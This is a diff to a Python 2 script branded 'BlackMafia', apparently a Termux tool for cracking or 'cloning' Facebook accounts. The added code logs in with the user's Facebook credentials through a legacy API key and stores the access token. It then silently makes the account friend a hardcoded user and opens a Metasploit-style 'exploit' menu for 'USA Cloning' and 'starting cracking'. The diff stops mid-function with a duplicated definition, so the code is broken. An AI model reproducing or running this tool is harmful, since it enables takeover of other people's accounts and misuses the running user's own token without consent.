@@ -151,7 +151,140 @@ while (loop == 'true'):
     else:
         print "\033[1;94mWrong Username"
         os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+def login():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r')
+		menu() 
+	except (KeyError,IOError):
+		os.system('clear')
+		print logo
+		jalan(' \033[1;94mWarning: \033[1;97mDo Not Use Your Personal Account' )
+		jalan(' \033[1;94mWarning: \033[1;97mUse a New Account To Login' )
+		jalan(' \033[1;94mWarning: \033[1;97mTermux Old Version install 0.63✅' )                 
+		print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
+		print('	   \033[1;97m▬\x1b[1;94m.........LOGIN WITH FACEBOOK........\x1b[1;97m▬' )
+		print('	' )
+		id = raw_input('\033[1;97m[+] \x1b[1;94mID/Email\x1b[1;97m: \x1b[1;94m')
+		pwd = raw_input('\033[1;97m[+] \x1b[1;94mPassword\x1b[1;97m: \x1b[1;94m')
+		tik()
+		try:
+			br.open('https://m.facebook.com')
+		except mechanize.URLError:
+			print"\n\x1b[1;97mThere is no internet connection"
+			keluar()
+		br._factory.is_html = True
+		br.select_form(nr=0)
+		br.form['email'] = id
+		br.form['pass'] = pwd
+		br.submit()
+		url = br.geturl()
+		if 'save-device' in url:
+			try:
+				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
+				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
+				x=hashlib.new("md5")
+				x.update(sig)
+				a=x.hexdigest()
+				data.update({'sig':a})
+				url = "https://api.facebook.com/restserver.php"
+				r=requests.get(url,params=data)
+				z=json.loads(r.text)
+				unikers = open("login.txt", 'w')
+				unikers.write(z['access_token'])
+				unikers.close()
+				print '\n\x1b[1;94mLogin Successful.•◈•..'
+				os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
+				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
+				menu()
+			except requests.exceptions.ConnectionError:
+				print"\n\x1b[1;97mThere is no internet connection"
+				keluar()
+		if 'checkpoint' in url:
+			print("\n\x1b[1;97mYour Account is on Checkpoint")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			keluar()
+		else:
+			print("\n\x1b[1;94mPassword/Email is wrong")
+			os.system('rm -rf login.txt')
+			time.sleep(1)
+			login()
 
+
+def menu():
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		os.system('clear')
+		print"\x1b[1;94mToken invalid"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('clear')
+		print"\033[1;97mYour Account is on Checkpoint"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		login()
+	except requests.exceptions.ConnectionError:
+		print"\x1b[1;94mThere is no internet connection"
+		keluar()
+	os.system("clear") #Dev:love_hacker
+	print logo
+	print "  \033[1;97m«----•◈••◈•----\033[1;94mLogged in User Info\033[1;97m----•◈••◈•-----»"
+	print "	   \033[1;97m Name\033[1;97m:\033[1;94m"+nama+"\033[1;97m               "
+	print "	   \033[1;97m ID\033[1;97m:\033[1;94m"+id+"\x1b[1;97m              "
+	print "\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•\033[1;94mBlackMafia\033[1;97m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ •◈•"
+	print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m1.\x1b[1;94mStart USA Cloning..."
+        print "\033[1;97m-•◈•-\033[1;97m> \033[1;97m0.\033[1;97mlogout            "
+	pilih()
+
+
+def pilih():
+	unikers = raw_input("\n\033[1;94mChoose an Option>>> \033[1;97m")
+	if unikers =="":
+		print "\x1b[1;97mFill in correctly"
+		pilih()
+	elif unikers =="1":
+		available_facebook_motah()
+	elif unikers =="0":
+		jalan('Token Removed')
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print "\x1b[1;91mFill in correctly"
+		pilih()
+
+def available_facebook_motah():
+ try:
+  amerr = str(raw_input(default+'WhoAmi exploits('red+'available_facebook_motah'+default+') > '))
+  if  amerr[:10] == "set nomber" or  amerr[:10] == "set NOMBER" :
+     nomber[0] = amerr[11:]
+     print "NOMBER => ", nomber[0]
+     available_facebook_motah()
+  elif amerr[:12] == "show options":
+   print ""
+   print ""
+   print"    options (available_facebook_motah):" 
+   print ""
+   print"        Name      Current Setting      Required      Description"
+   print"        NOMBER    "+nomber[0]+"                   yes           NOMBER "
+   print ""
+   print ""
+   available_facebook_motah()
+  elif amerr[:3] == "run" or amerr[:7] == "exploit":
+    kk = str(nomber[0])
+    print "[*]"+default+"starting cracking"
+    print ""
+    def motah():
+     
 def motah():
      
      email = str(raw_input("email"))
